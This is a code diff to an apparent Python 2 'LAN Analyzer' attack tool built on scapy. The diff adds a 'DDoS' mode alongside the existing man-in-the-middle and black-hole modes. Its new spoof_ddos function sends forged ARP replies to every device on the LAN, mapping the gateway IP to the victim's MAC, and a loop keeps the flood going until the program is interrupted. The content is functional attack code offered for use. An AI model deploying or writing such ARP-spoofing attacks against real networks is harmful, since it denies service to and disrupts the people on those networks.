@@ -19,6 +19,7 @@ broadcast_mac = "ff:ff:ff:ff:ff:ff"
 class AttackType(enum.IntEnum):
     MAN_IN_THE_MIDDLE = 1
     BLACK_HOLE = 2
+    DDOS = 3
 
 
 class SniffType(enum.IntEnum):
@@ -231,6 +232,54 @@ def restore_black_hole(gateway_IP, victim_IP, victim_MAC):
     time.sleep(3)
     print "[Info.] The LAN has been recovered."
 
+
+def ddos():
+    print "[Info.] Start to DDoS the victim"
+    victim_MAC = getmacbyip(victim_IP)
+    if victim_MAC is None:
+        print "[Error] Failed to get victim MAC."
+        print "[Info.] Now exiting."
+        sys.exit(0)
+    else:
+        print "[Info.] Victim %s's MAC: %s" % (victim_IP, victim_MAC)
+
+    while True:
+        try:
+            for item in device_list:
+                target_IP = item["IP"]
+                target_MAC = item["MAC"]
+                if target_IP != victim_IP:
+                    print "...target IP=%s, target MAC=%s..." % (target_IP, target_MAC)
+                    spoof_ddos(gateway_IP, target_IP, victim_MAC, target_MAC)
+            time.sleep(3)
+
+        except BaseException as e:
+            print "[Exception] %s %s" % (type(e), str(e))
+            restore_ddos(gateway_IP, victim_IP)
+            print "[Info.] DDoS attack is over."
+            print "[Info.] Program is shutting down."
+            sys.exit(1)
+
+
+def spoof_ddos(gateway_IP, target_IP, victim_MAC, target_MAC):
+    send(ARP(op=2, psrc=gateway_IP, pdst=target_IP, hwsrc=victim_MAC, hwdst=target_MAC), count=2)  # Fake ARP reply
+
+
+def restore_ddos(gateway_IP, victim_IP):
+    gateway_MAC = getmacbyip(gateway_IP)
+    print "[Info.] Start to recover the LAN."
+    print "[Info.] Please wait for a while."
+    print "[Info.] Sending real ARP replies to all devices..."
+    for item in device_list:
+        print "device info: %s" % item
+        target_IP = item["IP"]
+        target_MAC = item["MAC"]
+        if target_IP != victim_IP:
+            send(ARP(op=2, psrc=gateway_IP, pdst=target_IP, hwsrc=gateway_MAC, hwdst=target_MAC), count=2)  # Real ARP reply
+    time.sleep(3)
+    print "[Info.] The LAN has been recovered."
+
+
 if __name__ == "__main__":
     print "[Info.] LAN Analyzer is starting up..."
     print "[Info.] Scanning network interfaces..."
@@ -302,22 +351,21 @@ if __name__ == "__main__":
 
     print "[Info.] Target interface:%s, victim: %s" % (interface_name, device_list[(victim_info - 1)]["IP"])
 
-    available_attacking_mode = {AttackType.MAN_IN_THE_MIDDLE, AttackType.BLACK_HOLE}
+    available_attacking_mode = {AttackType.MAN_IN_THE_MIDDLE, AttackType.BLACK_HOLE, AttackType.DDOS}
     available_sniffing_mode = {SniffType.ALL_PACKETS, SniffType.VICTIM_PACKETS}
 
     while True:
         print "[Info.] Please select an attacking mode:"
-        print "[%d] Man in the middle(MITM)\n[%d] Black Hole" % (AttackType.MAN_IN_THE_MIDDLE, AttackType.BLACK_HOLE)
+        print "[%d] Man in the middle(MITM)\n[%d] Black Hole\n[%d] DDoS" % (AttackType.MAN_IN_THE_MIDDLE, AttackType.BLACK_HOLE,AttackType.DDOS)
         function_choice = int(raw_input("[Enter] Function:\n>>"))
         if function_choice in available_attacking_mode:
             break
 
     while True:
+        target_interface = interface_name
+        gateway_IP = device_list[(gateway_info - 1)]["IP"]
+        victim_IP = device_list[(victim_info - 1)]["IP"]
         if function_choice == AttackType.MAN_IN_THE_MIDDLE:
-            target_interface = interface_name
-            gateway_IP = device_list[(gateway_info - 1)]["IP"]
-            victim_IP = device_list[(victim_info - 1)]["IP"]
-
             while True:
                 print "[Info.] Please select the sniffing mode you want:"
                 print "[%d] All packets in the specific network interface\n[%d] Only packets related to the victim" \
@@ -328,10 +376,10 @@ if __name__ == "__main__":
             man_in_the_middle(sniffing_mode_choice)
             break
         elif function_choice == AttackType.BLACK_HOLE:
-            target_interface = interface_name
-            gateway_IP = device_list[(gateway_info - 1)]["IP"]
-            victim_IP = device_list[(victim_info - 1)]["IP"]
             black_hole()
+            break
+        elif function_choice == AttackType.DDOS:
+            ddos()
             break
         else:
             print "[Info.] Please select an available function"
